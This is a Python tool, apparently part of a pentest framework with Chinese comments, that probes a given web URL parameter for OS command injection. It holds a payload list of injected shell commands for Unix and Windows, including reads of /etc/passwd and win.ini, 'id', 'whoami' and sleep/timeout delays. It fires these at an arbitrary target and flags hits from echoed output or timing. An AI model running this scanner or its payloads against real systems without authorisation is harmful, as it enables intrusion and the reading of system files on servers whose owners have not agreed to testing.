# 开发者：自由的风
"""command_injector/run.py — 命令注入检测与利用
==============================================
攻击域 ready — 检测OS命令注入点，支持盲注(time-based)和回显检测。
"""
import sys, json, os, urllib.request, urllib.parse, time, re

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# 命令注入payload — Windows + Linux
CMD_PAYLOADS = [
    # 时间盲注(通用)
    ("; sleep 5 #", "Unix sleep盲注", "unix", "time"),
    ("| sleep 5", "Unix pipe sleep", "unix", "time"),
    ("`sleep 5`", "Unix backtick sleep", "unix", "time"),

    # Windows盲注
    ("| timeout /t 5", "Windows timeout盲注", "windows", "time"),
    ("& timeout /t 5", "Windows & timeout", "windows", "time"),

    # 回显检测
    ("; id", "Unix id命令", "unix", "echo"),
    ("| whoami", "Unix whoami", "unix", "echo"),
    ("; cat /etc/passwd", "Unix passwd读取", "unix", "echo"),
    ("& type C:\\Windows\\win.ini", "Windows文件读取", "windows", "echo"),
    ("| dir", "Windows dir", "windows", "echo"),

    # 特殊字符绕过
    ("; $(echo 1337)", "命令替换绕过", "unix", "echo"),
    ("| echo 1337", "基本pipe注入", "both", "echo"),
]


def _inject(url, payload, param="cmd", timeout=10):
    """发送命令注入payload"""
    try:
        encoded = urllib.parse.quote(payload)
        if "?" in url and "=" in url.split("?")[1]:
            test_url = url + f"&{param}={encoded}"
        elif "?" in url:
            test_url = url + f"?{param}={encoded}"
        else:
            test_url = url + f"?{param}={encoded}"

        start = time.time()
        req = urllib.request.Request(test_url, headers={"User-Agent": "GBT-Pentest/5.0"})
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = time.time() - start

        # 回显检测
        echo_signatures = ["uid=", "gid=", "root:", "/bin/", "1337",
                          "[fonts]", "[extensions]", "Windows", "Administrator"]

        has_echo = any(sig.lower() in body.lower() for sig in echo_signatures)

        return {
            "payload": payload[:60],
            "status": resp.status,
            "elapsed": round(elapsed, 3),
            "response_len": len(body),
            "body_preview": body[:300],
            "has_echo": has_echo,
        }
    except urllib.error.HTTPError as e:
        return {"payload": payload[:60], "status": e.code, "error_page": True}
    except Exception as e:
        return {"payload": payload[:60], "error": str(e)[:80]}


def do_test(params):
    """命令注入检测"""
    target = params.get("target", params.get("url", ""))
    if not target:
        return {"ok": False, "error": "缺少 target/url 参数"}
    if not target.startswith("http"):
        target = "http://" + target

    param = params.get("param", "cmd")

    # 基准请求(测正常响应时间)
    base = _inject(target, "normal_baseline", param)
    base_time = base.get("elapsed", 0.5) if base.get("elapsed") else 0.5

    findings = []
    for payload, desc, os_type, detect_type in CMD_PAYLOADS:
        result = _inject(target, payload, param)
        if not result:
            continue

        is_vuln = False
        evidence = ""

        if detect_type == "time":
            elapsed = result.get("elapsed", 0)
            if elapsed > base_time * 3:
                is_vuln = True
                evidence = f"时间延迟: {elapsed}s vs 基准{base_time}s"

        elif detect_type == "echo":
            if result.get("has_echo"):
                is_vuln = True
                evidence = f"命令回显: {result.get('body_preview', '')[:100]}"
            # 也检查时间差异
            elif result.get("elapsed", 0) > base_time * 2:
                is_vuln = True
                evidence = f"可能盲注(时间差异): {result.get('elapsed')}s"

        if is_vuln:
            findings.append({
                "payload": payload,
                "description": desc,
                "os_type": os_type,
                "evidence": evidence,
                "severity": "critical",
            })

    return {
        "ok": True,
        "cap": "command_injector",
        "action": "test",
        "domain": "攻击域",
        "target": target,
        "payloads_tested": len(CMD_PAYLOADS),
        "findings": findings,
        "vulnerable_count": len(findings),
        "verdict": "vulnerable" if findings else "clean",
        "suggestion": "永远不要将用户输入拼接到系统命令中，使用参数化API" if findings else None,
    }


def do_inject(params):
    return do_test(params)


HANDLERS = {"test": do_test, "inject": do_inject}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "test"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作: {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
